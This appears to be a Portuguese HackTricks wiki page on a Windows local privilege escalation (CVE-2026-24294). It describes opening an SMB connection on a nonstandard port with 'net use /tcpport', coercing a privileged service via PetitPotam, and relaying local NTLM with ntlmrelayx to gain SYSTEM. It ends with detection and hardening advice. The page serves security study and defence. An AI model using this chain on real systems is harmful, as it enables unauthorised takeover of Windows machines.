# Local NTLM Reflection via SMB Arbitrary Port

{{#include ../../banners/hacktricks-training.md}}

Builds recentes do Windows introduziram **suporte do cliente SMB a portas TCP alternativas**. Esse recurso pode ser abusado para transformar a **autenticação NTLM local** em uma **elevação local de privilégios para SYSTEM** quando o atacante consegue:<sup>[[1]](#references)</sup>

1. Abrir uma conexão SMB com um listener controlado pelo atacante em uma **porta diferente da 445**
2. Manter essa conexão TCP ativa
3. Induzir um **cliente local privilegiado** a acessar o **mesmo caminho de compartilhamento SMB**
4. Fazer relay da **autenticação NTLM local** resultante de volta para o serviço SMB real da máquina

Essa é a primitiva por trás do **CVE-2026-24294**, corrigido em **março de 2026**.<sup>[[1]](#references)[[4]](#references)</sup>

## Por que funciona

O antigo truque de reflection CMTI / serialized-SPN é abordado aqui:

{{#ref}}
../ntlm/README.md
{{#endref}}

Essa variante mais recente **não** precisa de um hostname marshalled. Em vez disso, ela abusa de dois comportamentos do cliente SMB:<sup>[[1]](#references)</sup>

- **Suporte a portas alternativas** no **Windows 11 24H2** e no **Windows Server 2025**, exposto aos usuários com `net use \\host\share /tcpport:<port>`
- **Reutilização / multiplexação de conexões SMB**, em que várias sessões autenticadas podem usar a mesma conexão TCP

Isso significa que um usuário com poucos privilégios pode primeiro criar uma conexão TCP do cliente SMB para um servidor SMB do atacante em uma porta alta e, em seguida, induzir um serviço privilegiado a acessar o **mesmo caminho UNC exato**. Se o Windows decidir reutilizar a conexão TCP existente, a troca NTLM privilegiada será enviada pelo transporte controlado pelo atacante e poderá ser encaminhada por relay para o servidor SMB local.<sup>[[1]](#references)</sup>

## Pré-requisitos

- O alvo oferece suporte a portas alternativas SMB:<sup>[[2]](#references)</sup>
- **Windows 11 24H2** ou posterior
- **Windows Server 2025** ou posterior
- O atacante pode executar um servidor SMB local ou remoto em uma porta alta escolhida
- O atacante pode induzir um serviço privilegiado a acessar um caminho UNC
- A autenticação privilegiada deve ser **autenticação NTLM local**
- O alvo deve permitir relay:<sup>[[1]](#references)</sup>
- A Synacktiv relatou que isso funcionava por padrão no **Windows Server 2025**
- A cadeia não funcionou no **Windows 11 24H2** porque a assinatura SMB de saída é imposta por padrão

## Userland e internals

Na linha de comando, o recurso parece simples:
```cmd
net use \\192.168.56.3\share /tcpport:12345
```
Programaticamente, o cliente usa `WNetAddConnection4W` com dados `lpUseOptions` não documentados. A opção relevante é `TraP` (transport parameters), que eventualmente chega ao cliente SMB do kernel por meio de um FSCTL e é analisada pelo `mrxsmb`.<sup>[[1]](#references)[[3]](#references)</sup>

Observações práticas importantes:<sup>[[1]](#references)</sup>

- **A sintaxe UNC ainda não possui um campo de porta**
- **`net use` é por sessão de logon**
- O bypass ainda funciona porque **a conexão TCP e a sessão SMB são objetos separados**
- Reutilizar o **mesmo caminho de compartilhamento** é obrigatório se o exploit depender do cliente SMB reutilizar a conexão TCP criada anteriormente

## Fluxo de exploração

### 1. Criar o transporte SMB controlado pelo atacante

Execute um servidor SMB em uma porta alta e faça o Windows conectar-se a ele:
```cmd
net use \\192.168.56.3\share /tcpport:12345
```
O servidor pode aceitar qualquer par de credenciais que você controle, por exemplo `user:user`. O objetivo desta etapa ainda não é fazer privilege escalation, mas apenas fazer o cliente SMB do Windows abrir e manter uma conexão TCP reutilizável com o seu listener.<sup>[[1]](#references)</sup>

### 2. Force um serviço privilegiado a usar o mesmo caminho UNC

Use uma coercion primitive, como **PetitPotam**, contra o **mesmo** caminho `\\192.168.56.3\share`. Se o cliente coagido tiver privilégios e o nome de destino for local (`localhost` ou um IP/host local), o Windows executará **autenticação NTLM local**.

Como a conexão TCP é reutilizada, essa troca NTLM privilegiada será enviada ao serviço SMB do attacker, em vez de diretamente ao servidor SMB local real.<sup>[[1]](#references)</sup>

### 3. Relay da autenticação privilegiada de volta ao SMB local

O serviço SMB controlado pelo attacker encaminha a troca NTLM privilegiada para `ntlmrelayx.py`, que faz relay para o listener SMB real da máquina e obtém uma sessão como `NT AUTHORITY\SYSTEM`.<sup>[[1]](#references)</sup>

Ferramentas típicas do writeup público:<sup>[[1]](#references)</sup>

- `smbserver.py` em uma porta customizada para receber a autenticação privilegiada pela conexão TCP reutilizada
- `ntlmrelayx.py` para fazer relay do NTLM capturado para o SMB local
- `PetitPotam.exe` ou outra coercion primitive para forçar a autenticação privilegiada

## Notas para o operador

- Esta é uma técnica de **local privilege escalation**, não um truque genérico de remote relay<sup>[[1]](#references)</sup>
- O serviço SMB controlado pelo attacker deve processar a autenticação privilegiada na **mesma conexão TCP** usada originalmente para montar o compartilhamento<sup>[[1]](#references)</sup>
- Se o acesso coagido atingir um **caminho de compartilhamento diferente**, o Windows poderá estabelecer uma conexão diferente e a cadeia será interrompida<sup>[[1]](#references)</sup>
- Os requisitos de SMB signing podem impedir o relay mesmo quando a etapa de porta arbitrária funciona<sup>[[1]](#references)</sup>
- Se você tiver apenas material Kerberos ou não puder forçar NTLM local, esta variante exata não será suficiente<sup>[[1]](#references)</sup>

## Detecção e hardening

- Instale o patch do **CVE-2026-24294** do **Patch Tuesday de março de 2026**<sup>[[4]](#references)</sup>
- Monitore o uso de `net use` ou `New-SmbMapping` com **portas SMB não padrão**<sup>[[1]](#references)</sup>
- Gere alertas para SMB de saída incomum de workstations ou servidores para **portas TCP altas**<sup>[[1]](#references)</sup>
- Revise oportunidades de coercion, como triggers no estilo **EFSRPC / PetitPotam**<sup>[[1]](#references)</sup>
- Imponha SMB signing sempre que possível; a Synacktiv observa especificamente que isso bloqueou o relay no Windows 11 24H2<sup>[[1]](#references)</sup>

## Referências

- [1] [Synacktiv - Bypassing Windows authentication reflection mitigations for SYSTEM shells - Part 1](https://www.synacktiv.com/en/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1.html)
- [2] [Microsoft Learn - Configure alternative SMB ports for Windows Server 2025](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ports)
- [3] [Microsoft Learn - WNetAddConnection4W](https://learn.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection4w)
- [4] [MSRC - CVE-2026-24294](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-24294)

{{#include ../../banners/hacktricks-training.md}}
